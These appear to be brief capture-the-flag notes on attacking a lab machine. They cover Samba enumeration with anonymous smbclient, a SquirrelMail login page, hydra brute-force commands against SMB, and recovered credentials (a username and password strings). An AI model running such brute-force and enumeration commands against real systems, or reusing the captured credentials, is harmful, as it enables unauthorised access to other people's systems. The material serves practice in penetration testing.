445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)


smbclient -L //10.113.130.138 -N
(lists clients)



http://10.113.130.138/squirrelmail/src/login.php



hydra -l [username] -P [your_password_list.txt] [target_ip] smb -V -f

hydra -l skynet -P Downloads/skynet.txt [target_ip] smb -V -f


works http://10.113.130.138/squirrelmail/
 
milesdyson
cyborg007haloterminator

)s{A&2Z=F^n_E.B`
